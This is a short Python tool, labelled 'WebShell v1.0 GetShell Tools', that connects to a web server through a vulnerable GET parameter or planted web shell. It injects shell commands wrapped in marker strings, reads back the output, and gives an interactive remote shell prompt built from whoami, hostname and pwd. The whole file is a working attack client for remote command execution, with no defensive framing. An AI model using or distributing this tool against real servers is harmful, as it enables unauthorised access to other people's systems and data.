import requests
import random
import time
import re
import os

print("\033[1;31m[\t          \t ]\033[0m")
print("\033[1;31m[\t[ WebShell ]\t ]\033[0m")
print("\033[1;31m[\t   v1.0   \t ]\033[0m")
print("\033[1;33m[      GetShell Tools\t ]\033[0m")
print("\033[1;34m[     [2021 BY FengZi]   ]\033[0m")
url = input("Please input the URL :")
arg = input("Please input thr Parameter (GET) :")
cookie = input("Please input thr Cookie (Please use N if not required) :")

user,hostname,path='','',''
def get_info():
    global user,hostname,path
    user=run_cmd('whoami')
    hostname=run_cmd('hostname')
    path=run_cmd('pwd')
def run_cmd(cmd):
    global url,cs,arg,ran,cookies
    r = requests.get(url+cs+arg+"=echo 'WebShell["+ran+"]';"+cmd+";echo '["+ran+"]End';", cookies=cookies)
    if r.status_code == 200:
            cmd_return=re.search(r'^WebShell\['+ran+r'\]\n(.|\n)*\n\['+ran+r'\]End', r.text)
            if cmd_return !=None:
                res=cmd_return.group(0)
                return res[15:len(res)-10] # 临时解决方法

if (cookie == 'N'):
    cookie = ''
else:
    cookies = {}
    for line in cookie.split(';'):
        name, value = line.strip().split('=', 1)
        cookies[name] = value

if url.find('?') == -1:
    cs = '?'
    _url=re.search(r'^http(.*)\/', url).group()
else:
    cs = '&'
    _url=re.search(r'^http(.*)\/\?', url).group()
    _url=re.search(r'^http(.*)\/', _url).group()


ran = str(random.randint(0, 9))+str(random.randint(0, 9)) + \
    str(random.randint(0, 9))+str(random.randint(0, 9))
yg = url+cs+arg+"=echo \"WebShellv1.1GETTIME='" + \
    str(time.time())+"'NUM='"+ran+"'\""
r = requests.get(yg, cookies=cookies)
r.encoding = 'utf-8'
if r.status_code == 200:
    if url.find(yg) == -1:
        print("The connection is successful")
    else:
        print("Cannot connect \nEXIT")
i = os.system('cls')
while True: 
    get_info()
    cmd=input('\033[1;34m'+user+'@'+hostname+'\033[0m:\033[1;32m'+path+'\033[0m $ ')
    return_res=run_cmd(cmd)
    if return_res!=None :
        print(return_res)